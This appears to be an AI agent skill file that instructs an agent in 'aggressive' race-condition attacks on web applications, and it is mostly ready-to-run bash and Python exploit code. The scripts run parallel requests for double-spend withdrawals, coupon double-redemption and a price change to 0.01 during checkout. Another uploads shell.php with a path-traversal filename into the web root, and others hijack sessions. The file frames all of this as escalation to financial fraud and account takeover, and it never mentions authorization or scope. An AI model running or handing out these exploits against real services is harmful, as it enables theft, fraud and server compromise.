---
name: hunt-race
description: Race condition hunting — TOCTOU, double-spend, double-redeem, parallel request techniques. Generates ready-to-run exploits, Turbolence configs, and Python threading scripts. Escalates to privilege escalation, financial fraud, and account takeover.
---

# RACE CONDITION HUNTING — AGGRESSIVE ATTACK MODE

**Race conditions = timing-based bugs that bypass business logic in one burst.**

## Quick Start

```bash
# Basic race test with curl
TARGET="https://target.com/api/redeem"
CODE="PROMO123"
for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code} " -X POST \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$CODE\"}" "$TARGET" &
done
wait
echo ""
```

## Detection Methodology

### Parallel Request Pattern

```bash
#!/bin/bash
# race-test.sh — Send N parallel identical requests
TARGET="$1"
ENDPOINT="$2"
TOKEN="$3"
N=10

echo "[*] Sending $N parallel requests to $ENDPOINT"

for i in $(seq 1 $N); do
  curl -s -o "resp_$i.txt" -w "req_$i: HTTP %{http_code} (%{time_total}s)\n" \
    -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"action":"redeem","code":"TEST123"}' \
    "$TARGET$ENDPOINT" &
done
wait

echo "[*] Results:"
for i in $(seq 1 $N); do
  echo "  $(cat resp_$i.txt | head -1)"
done

# Analyze: if multiple requests succeed, race condition exists
```

### Response Analysis

```bash
# Count successful vs failed responses
cat resp_*.txt | grep -o "HTTP [0-9]*" | sort | uniq -c
# GOOD (no race): 1 success, 9 failures
# BAD (race): multiple successes
```

## Attack Patterns

### TOCTOU (Time-of-Check to Time-of-Use)

Check and use are separate operations — exploit the gap.

```python
#!/usr/bin/env python3
"""TOCTOU race: balance check → deduction with parallel execution."""
import requests
import threading
import sys

TARGET = sys.argv[1]
TOKEN = sys.argv[2]
AMOUNT = "100.00"

results = []

def withdraw(i):
    """Each thread attempts withdrawal simultaneously."""
    r = requests.post(
        f"{TARGET}/api/withdraw",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"amount": AMOUNT}
    )
    results.append((i, r.status_code, r.text[:100]))
    print(f"[{i}] {r.status_code}: {r.text[:80]}")

threads = []
for i in range(20):
    t = threading.Thread(target=withdraw, args=(i,))
    threads.append(t)

# Start all threads as close together as possible
for t in threads:
    t.start()
for t in threads:
    t.join()

successes = [r for r in results if r[1] == 200]
print(f"\n[+] {len(successes)}/20 requests succeeded")
if len(successes) > 1:
    print("[!] RACE CONDITION CONFIRMED — double-spend!")
```

### Double-Spend / Double-Redeem

```bash
# Redeem a coupon/gift card with parallel requests
# All requests hit before the first one marks the code as used

#!/bin/bash
TARGET="$1"
CODE="$2"
TOKEN="$3"
N=15

echo "[*] Double-redeem test: $CODE"
for i in $(seq 1 $N); do
  curl -s -w "\n[$i] HTTP %{http_code}\n" -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"code\":\"$CODE\"}" \
    "$TARGET/api/coupon/redeem" | tail -2 &
done
wait
# If multiple succeed → double-redeem confirmed
```

### Registration Race (Duplicate Accounts)

```bash
# Create duplicate accounts with same email
TARGET="https://target.com/api/register"

for i in $(seq 1 10); do
  curl -s -o /dev/null -w "req_$i: HTTP %{http_code}\n" \
    -X POST \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"password\":\"pass123\"}" \
    "$TARGET" &
done
wait
# Check: did multiple accounts get created?
```

### Payment / Order Processing Race

```python
#!/usr/bin/env python3
"""Race condition in checkout — manipulate price before processing."""
import requests
import threading
import sys

TARGET = sys.argv[1]
TOKEN = sys.argv[2]
ORDER_ID = sys.argv[3]

# Step 1: Add item to cart, start checkout
# Step 2: In parallel, update price (if price-update endpoint exists) + confirm order
results = []

def update_price():
    r = requests.post(
        f"{TARGET}/api/cart/update",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"item_id": "123", "price": "0.01"}
    )
    results.append(("price_update", r.status_code))

def confirm_order():
    r = requests.post(
        f"{TARGET}/api/order/confirm",
        headers={"Authorization": f"Bearer {TOKEN}"},
        json={"order_id": ORDER_ID}
    )
    results.append(("confirm", r.status_code))

# Fire both simultaneously
t1 = threading.Thread(target=update_price)
t2 = threading.Thread(target=confirm_order)
t1.start(); t2.start()
t1.join(); t2.join()

for r in results:
    print(f"  {r[0]}: HTTP {r[1]}")
```

### File Upload Race (Path Traversal During Check)

```bash
# Upload file → race with file movement → path traversal
# Step 1: Upload file with path traversal name
# Step 2: Race to exploit during file move operation

# Upload with traversal name
curl -s -X POST \
  -H "Authorization: Bearer TOKEN" \
  -F "file=@shell.php;filename=../../../var/www/html/shell.php" \
  "$TARGET/api/upload"

# Parallel: trigger file move
for i in $(seq 1 5); do
  curl -s -X POST \
    -H "Authorization: Bearer TOKEN" \
    -d '{"move_to":"public"}' \
    "$TARGET/api/file/move" &
done
wait
```

### Session Fixation Race

```bash
# Race in session creation → hijack session
# Step 1: Initiate login (server sets session cookie)
# Step 2: Race: complete login + use session from step 1

# Thread 1: Complete login
curl -s -c cookies.txt -X POST \
  -d "user=Victim&pass=pass" \
  "$TARGET/login" &

# Thread 2: Use session from thread 1's cookie
sleep 0.01
curl -s -b cookies.txt "$TARGET/api/account" &

wait
```

## Turbo Intruder / Turbolence Scripts

### Turbolence Python Script

```python
#!/usr/bin/env python3
"""Generic race condition exploit using concurrent requests."""
import requests
import concurrent.futures
import sys
import time

TARGET = sys.argv[1]
ENDPOINT = sys.argv[2]
TOKEN = sys.argv[3]
PAYLOAD = sys.argv[4]  # JSON payload
N = int(sys.argv[5]) if len(sys.argv) > 5 else 20

def send_request(i):
    start = time.time()
    try:
        r = requests.post(
            f"{TARGET}{ENDPOINT}",
            headers={
                "Authorization": f"Bearer {TOKEN}",
                "Content-Type": "application/json"
            },
            json=PAYLOAD,
            timeout=10
        )
        elapsed = time.time() - start
        return {
            "thread": i,
            "status": r.status_code,
            "time": round(elapsed, 3),
            "body": r.text[:200]
        }
    except Exception as e:
        return {"thread": i, "status": "error", "time": 0, "body": str(e)}

print(f"[*] Racing {N} requests to {ENDPOINT}")
start_time = time.time()

with concurrent.futures.ThreadPoolExecutor(max_workers=N) as executor:
    futures = {executor.submit(send_request, i): i for i in range(N)}
    results = []
    for future in concurrent.futures.as_completed(futures):
        results.append(future.result())

total_time = time.time() - start_time
results.sort(key=lambda x: x["thread"])

success = sum(1 for r in results if r["status"] == 200)
print(f"\n[+] Results: {success}/{N} succeeded in {total_time:.2f}s")
for r in results:
    status = "OK" if r["status"] == 200 else "FAIL"
    print(f"  Thread {r['thread']}: {r['status']} ({r['time']}s) [{status}]")

if success > 1:
    print("\n[!!!] RACE CONDITION CONFIRMED")
```

### Turbo Intruder Configuration

```
# In Burp Suite → Extensions → Turbo Intruder
# Race template: race.py

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)

    for i in range(30):
        engine.queue(target.basepath, target.baseinput)

def handleResponse(req, interesting):
    table.add(req)
```

## Checklist

- [ ] Test balance/wallet withdrawal with parallel requests
- [ ] Test coupon/gift card redemption with parallel requests
- [ ] Test account creation with duplicate email/phone
- [ ] Test order/checkout with price modification race
- [ ] Test file upload + move operations
- [ ] Test session creation + usage in parallel
- [ ] Test rate limiting with burst requests
- [ ] Test voting/like systems with parallel submissions
- [ ] Test fund transfer with balance check + deduction
- [ ] Analyze response codes — multiple successes = race confirmed
- [ ] Test across different HTTP methods (GET races on state-changing endpoints)

## Tools

- **Turbo Intruder** (Burp extension) — Built-in race templates
- **Turbolence** — Standalone race testing tool
- **race-rs** — Rust-based race condition exploit tool
- **Python threading** — Custom concurrent request scripts
- **curl + background** — `curl ... &` for quick parallel tests

## Severity Escalation

| Race Target | Impact | Severity |
|-------------|--------|----------|
| Wallet withdrawal | Double-spend / financial loss | Critical |
| Coupon redemption | Double-redeem / revenue loss | High |
| Account creation | Duplicate accounts / spam | Medium |
| File upload | Path traversal → RCE | Critical |
| Payment processing | Price manipulation | Critical |
| Session management | Session fixation → account takeover | High |
| Rate limiting bypass | Brute force / abuse | Medium |
| Vote/like manipulation | Integrity bypass | Low-Medium |
